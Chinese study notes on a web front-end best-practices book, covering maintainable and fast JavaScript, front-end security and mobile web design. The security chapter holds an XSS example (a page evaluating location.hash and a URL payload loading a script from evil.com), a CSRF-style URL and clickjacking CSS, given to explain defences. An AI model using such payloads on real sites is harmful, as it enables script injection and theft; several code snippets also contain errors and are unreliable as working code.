#### **ch09 JS - 高维护性**

* 基础

```js
// 避免定义全局变量或函数
把变量和方法封装到对象里
封装在局部作用域里   

// 防止代码污染
var hi = (function() {
var length = 0;
function init() {
console.log("hello");
}

function action() {

}

return {
init: init
}
}());

hi.init();

// 使用简化的编码方式 
// 不要用new
// == ===

避免使用with 多出单独的作用
避免eval

// 不要编写检测浏览器的代码
取而代之的是检测浏览器是否支持某一特定功能 $.support
或者Modernizr

兼容代码单独放在文件里
<! -- [if it ie 9]>
<script src="xx.js"></script>
<! [endif]-->
```

* 其他

```js
// use strict 
不要全局启用
放函数里或放在自执行函数里

在已有代码中谨慎启用严格模式 - 重构

// JSHint JSLint

//  分离
事件处理与业务逻辑分离
配置数据与代码逻辑分离
逻辑与结构样式分离

// 从JS中分离CSS
style.borderColor -> style.cssText
style.cssText -> className += “empty”
h5 list[i].classList.add('empty');

// 从JS中分离HTML
从服务器端获取html
Jq $('').load();
从客户端动态生成页面结构
h5 template标签

<script id="main_info" type="text/x-tmpl">
<li><b>${name}<b> (${class})</li>
</script>

var infoTmpl = document.getElementById('main_info').innerHTML();
```

* JS模板的使用

```
Mustache Logic-less 易被集成
Handlebars 支持预编译
underscore
其他： Jade EJS Micro-Templating
网站 Template-engine-chooser
不要在模板中滥用逻辑块
不要构建太复杂的模板
使用预编译模板
Grunt预先把Handlebars
```

* 使用MVC模式

```js
Angular Meteor Ember Knockout Backbone
双向绑定 模板 路由 可观察对象
TodoMVC项目
```

* JS模块化开发

```js
CommonJS 同步 node.js 服务器端
AMD 异步 有网络延迟的浏览器
requireJS 管理前端代码模块
curl
jquery也可支持

        // 防污染
        var module = (function($, mudule2) {
          // code
        })(jQuery, module2);

        // 让jq支持AMD
        if( typeof mudule === "object"
            && module
            && typeof module.exports === "") {
          module.exports = jQuery;
        } else {
          window.jQuery = window.$ = jQuery;
          if(typeof define === "function" && define.end ) {
            define("jQuery", [], function() { return jQuery; });
          }
        }
```

* 合理使用AJAX技术

```
明确ajax的使用场景
有些跳转页面即可
ajax会破坏浏览器回退按钮 - jquery-hashchange
借助成熟的ajax框架，但不要忘记原生方法
jQuery, Dojo， YUI， ExtJS
做好用户交互
进行ajax时给用户反馈
防止用户重复操作 禁用按钮
时间限制，超时终止
使用JSON
使用合适的方案，弥补ajax的不足
```

#### **ch10 JS - 高性能**

* JS加载
  * 模块加载框架 HeadJS RequireJS LABjs
  * defer\(JS代码不会产生页面内容\) 和 async\(不受限于顺序\)
  * 不优雅的方式，动态创建JS元素

```js
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src="file.js";
    document.getElementByTagName_r("head")[0].appendChild(script);
```

* 拼接字符串的三种方案
  * 不同浏览器（优化不同）执行速度不同，所以不用计较

```js
// solution 1
str += "hello" + "js";

// solution 2
str += "hello";
str += "world";针对原始图片独立做一台缩略图

// solution 3
var strArr = [];
strArr.push('str');
strArr.push("world");
str = strArr.join("");
```

* 尽管不能确认最优，但是可以知道什么是可以优化的
  * 嵌套循环时把大循环当做内循环
  * new String Number Boolean\(不推荐\) -&gt; var a = true;
  * 缓存计算结果，例如缓存浏览器滚动条宽度
* 其他性能优化
  * 少用 for in
  * clone

```js
    function clone() {
        if(null == obj || "object" != typeof obj) return obj;
        var copy = obj.constructor();
        copy.foo = obj.foo;
        copy.bar = obj.bar;
        return  copy;
    }
```

* 数组尽量不要混合多种数据类型，可以用对象
* 不要在闭包中返回外部不需要的对象
* 及时移除dom监听
* 少用全局变量
* delete 在chrome中可能妨碍性能优化
* 避免多次的跨作用查询,作用域链有关

```js
    function update() {
        var doc = document;
        var imgs = doc.getElementsByTagName("img");
        for(var i=0, len=imgs.length; i<len; i++) {
            imgs[i].title = doc.title + "- image-" + i;   
        }
    }
```

* 不推荐使用with，无形中形成作用域
* try catch, catch处理一脚外部函数

```js
          try {
          } catch(ex) {
              errorHandler(ex);
          }
```

* DOM操作
  * 重绘与重排
    * 增删和修改元素可见性
    * 页面初始化渲染
    * 移动DOM元素
    * 修改CSS样式
    * DOM元素内容改变
    * 窗口尺寸改变
    * 浏览器窗口滚动
  * 合并多次的DOM操作为单次
  * 把DOM元素离线或者隐藏后修改
    * clone DOM 到内存

```js
        var old = document.getElementById("myElement");
        var clone = old.cloneNode(true);
        old.parentNode.replaceChild(clone, old);
```

* 设置具有动画效果的DOM元素position为fixed或absolute
* 谨慎取得DOM元素的布局信息
  * 浏览器会优化连续的DOM操作
    * 使用事件托管方式绑定事件
      * 在父元素上绑定，然后判断子元素事件
    * 辅助工具 PageSpeed YSlow jsPerf
    * JavaScript性能测试库 JSLitmus

#### **ch11 JS - 高安全性**

* 国内著名的漏洞报告平台 - 乌云网
* 黑客攻击网站的主要手段有
  * SQL注入
  * 网络钓鱼
  * 跨站攻击
  * 拒绝服务攻击
* 攻击网站前端的方法
  * XSS 跨站点脚本攻击
    * 同源策略没有限制页面中加载第三方的脚本
    * 尽一切方法在目标网站上执行非目标网站上原有的脚本

```js
        <script>
            eval(location.hash.substr(1));
        </script>

        http://host/test.html#document.write("<script/src=//www.evil.com/evil.com/evil/js></script>")
```

* CSRF 跨站点请求伪造 请求来源于其他网站

```js
    http:www.a,com/del?id=21
```

* 界面操作劫持
  * 点击劫持
  * 拖放劫持
  * eg. 可见输入框内覆盖一个不可见的框

```js
        filter: alpha(opacity=0);
        opacity: 0;
        z-index: 100
```

* 不要轻易相信任何外部传入的数据
  * 不要轻易信任用户输入的数据 -&gt; 数据过滤
    * Jq中$\(''\).text\(\) 而非 html\(\)
    * 使用$\(''\).attr\(\) css\(\)
    * URL -&gt; encodeURL
    * jqencoder
    * setTimeout setInterval eval 这些函数都有安全隐患
  * 不要轻易信任任何传入的第三方数据
    * JSONP 一定要检查从第三方返回的数据格式
  * 不要仅靠JS来阻止注入
* 其他前端安全防范实践
  * cookie 设置为httpOnly
    * XSS不能通过JS获取Cookie
    * h5的localStorage
    * SSL 启用cookie的Secure设置
  * 防止网页被其他网站内嵌为iframe
    * JS阻止

```js
        <style id="antiClickjack">body{display:none !important; }<style>

        <script>
        if(self === top) {
            var antiClickjack = document.getElementById('antiClickjack');
            antiClickjack.parentNode.removeChild(antiClickjack);
        } else {
            top.location = self.location;
        }
        </script>
        // 首先设置不可见
        // 如果没有被内嵌移除不可见样式
        // 否则把顶层页面的地址设置成内嵌页面的地址
```

* X-Frame-Options响应头
  * DENY
  * SAMEORIGIN 
  * ALLOWFROM URI ?? 允许特定域

#### **ch12 移动Web前端**

```
市场以webkit为核心的浏览器占主导 // 易于兼容工作
// 浏览器是移动Web网页的载体

// 移动与PC的差异
// 显示 
viewport
虚拟 
// 操作
```

* * 显示
    * viewport
    * 虚拟键盘遮挡
  * 操作
    * 移动端的多点操作 
      * touchstart touchmove touchend **touchcancel**
    * rodio checkbox link 易误操作
    * hover已死 用active代替
  * 带宽
* 桌面Web页面兼容移动设备
  * 用户体验最佳 -&gt; 专门开发移动端网站
  * 成本角度 -&gt; 一个网站兼容所有设备
    * flow布局 // 使用百分比 权重布局
    * CSS Media queries // 媒体查询
      * link里的media
      * @media\(max-width: 600px\)
      * [相关网站](http://cssmediaqueries.com/)
    * 图片 
      * max-width: 100%; 
      * img的srcset属性 不同场景不同的加载需求 eg Retina
      * h5提议的picture标签着落。。。
      * 目前较好： picturefill JS库
    * meta里设置viewport

```js
        <meta name="viewport" content="width=device-width, initial-scale=1">
```

* widgets 长宽最少 48px
* 响应式框架
  * Foundation
  * Skeleton
  * bootstrap
* 检查兼容性
  * MobiReady
  * W3C mobileOK Checker
  * ipadPeek 输入测试网址
  * Google Howtogomo 截屏 + 建议
    * 单独开发移动端站点的准备工作
    * 确认支持的设备
    * 处理和桌面端网站的交互
* 如果在移动端输入PC端网址自动跳转 User-Agent
* JS实现
  * isMobile
  * mobile-detect （PHP）
    * 设计单页模式，避免跳转
    * 选择合适的前端框架
* **jQuery Mobile** 上手容易
* Sencha Touch 
  * Sencha Ext JS
* Kendo UI
  * 强大的web控件厂商telerik
* Ionic
  * 基于node.js
  * 深度集成Angular
    * 有选择地使用其中部分的模块
    * 最小限度地减少所使用的框架的大小
    * 调试
* Chrome自带的模拟
* Chrome远程调试
  * 移动端HTML + CSS +JS的最佳实践
  * head中添加必要的meta或link
* viewport
* format-detection // 自动识别电话号码
  * 使用mailto连接, 快速打电话发短信

```js
    <a href="tel:1-406-666-xxxx">1-406-666-xxxx</a>
```

* 不要使用iframe,慎用table
  * ul ol 来代替table
    * 或者table竖向显示
    * jQuery mobile 数据优先级
    * iframe采用超链接代替
    * 更好的方法是让第三方提供内容的API
    * XML或者JSON格式
    * 使用相对单位设置元素尺寸
    * 可点击控件设置足够大的尺寸
    * 可点击控件之间留下足够大的空间
    * 少用图片，小图片考虑icon
    * Font Awesome
    * Bootstrap Glyphicons
    * Base64格式 + Data URLs
    * 不要使用:hover设置悬停效果
    * 设置合理的字体大小\(16px\)和行高\(1.5\)
    * 在不需要选中文字区域禁用文字选中功能
    * 右键单击 -&gt; 触摸长按

```js
        -webkit-user-selector: none;
        -webkit-touch-callout: none;
```

* 触发鼠标事件滞后300毫秒（可察觉的延迟）
  * 模拟click -&gt; tap事件
  * 模拟右键 -&gt; taphold 
* 横竖屏切换禁止
  * hack方案来模拟静止横竖屏切换
  * 更推荐的方案 orientationchange或者给出提示信息
* 慎用弹出窗口，标准对话框外观不一致最好统一重写
* 慎用Timer setInterval setTimeout

  * 只有Android Chrome在浏览器转后台是任然执行JS
  * Timer完成准确控制时间任务不太靠谱

* ##### **参考**

```js
web前端最佳实践 党建
```


